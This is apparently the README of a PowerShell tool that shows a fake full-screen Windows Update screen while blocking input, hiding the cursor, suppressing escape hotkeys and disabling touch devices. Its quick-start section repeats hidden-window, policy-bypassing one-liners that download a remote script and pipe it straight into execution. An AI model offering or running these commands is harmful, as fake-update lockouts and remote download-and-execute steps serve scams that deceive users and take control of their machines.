DWA — Windows Update Mock (PowerShell)
A Windows Update–style full-screen UI that temporarily blocks input, hides/clips the cursor, suppresses hotkeys, and can optionally disable/enable specific HID devices (touchpad/touchscreen/digitizer) similar to Device Manager. Intended for demos/testing and should be used carefully and only in controlled environments.

Requires: Administrator + STA

OS: Windows 10/11

Shell: Windows PowerShell 5.1 recommended (pwsh may work but STA/WinForms is more reliable on 5.1)

Important: This script can temporarily block user input and disable certain HID devices; test in a safe environment first.

Quick Start (one-liner)
Run from CMD with admin privileges:

text
powershell -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
Run from CMD (alternate raw URL form):

text
powershell -nop -w hidden -sta -ep Bypass -c "iwr -useb https://github.com/sam-tam-sam/DWA/raw/main/script.ps1 | iex"
Run using a fully qualified path (helpful if PATH doesn’t include powershell):

text
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
If running a 32‑bit process on 64‑bit Windows, use Sysnative:

text
"C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
Download to temp then execute (works better behind some proxies/filters):

text
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -sta -ep Bypass -c "$u='https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1';$p=$env:TEMP+'\dwa.ps1';iwr -useb $u -outfile $p; & 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -sta -ep Bypass -File $p"
What it does
Full-screen, topmost UI that mimics Windows Update progress.

Progress bars, status messages, and timed completion.

Temporarily blocks input via BlockInput and low-level keyboard hook.

Hides and clips the mouse cursor to the screen.

Suppresses common escape hotkeys (Win, Alt+Tab, Alt+F4, Ctrl+Esc).

Optionally disables selected HID devices (touchpad, touchscreen, digitizer, pen) during the run, then re-enables them at the end.

Safety and recovery
The script includes comprehensive cleanup in all exit paths:

Unblocks input.

Unhooks keyboard hook.

Restores cursor visibility and unclips cursor.

Re-enables previously disabled HID devices.

If any HID device fails to re-enable automatically:

Re-scan devices:

text
pnputil /scan-devices
Re-enable a specific device:

text
Enable-PnpDevice -InstanceId '<DEVICE_INSTANCE_ID>' -Confirm:$false
Perform these from an elevated (Run as administrator) PowerShell session. Success rates are higher in an interactive user session (local or RDP).

Headless mode (non-interactive sessions)
If the script detects a non-interactive desktop session (common in some remote agents/services), it will automatically run in headless mode:

No UI, no input blocking, no cursor operations.

Simulated progress logs in the console.

HID disable/enable still attempted with cleanup.

This prevents errors like “not running in UserInteractive mode.”

Requirements
Administrator privileges.

STA thread apartment (use -sta).

Windows PowerShell 5.1 recommended for WinForms and STA.

PnpDevice module (built-in on Windows 10/11) for HID operations; if unavailable, HID disable/enable is skipped safely.

Typical usage
Open CMD as Administrator and run:

text
powershell -nop -w hidden -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
Or on an interactive RDP/local session to see the UI and enforce input restrictions:

text
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -sta -ep Bypass -c "iwr -useb https://raw.githubusercontent.com/sam-tam-sam/DWA/main/script.ps1 | iex"
Troubleshooting
'powershell' is not recognized…

Use the full path:

text
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ...
From 32‑bit host on 64‑bit Windows, use Sysnative path.

UI fails with “not in UserInteractive mode”:

You are in a non-interactive session; run from an interactive desktop (local or RDP), or rely on headless mode behavior.

Some HID devices don’t re-enable:

Re-scan devices:

text
pnputil /scan-devices
Re-enable manually:

text
Enable-PnpDevice -InstanceId '<DEVICE_INSTANCE_ID>' -Confirm:$false
Consider a short reboot if a driver stack needs reload.

Security notice
This tool intentionally restricts input and manipulates HID devices; use only with explicit consent and in controlled environments.

Review and understand the script before running it.

License
This project is provided as-is, without warranty. Use at your own risk.
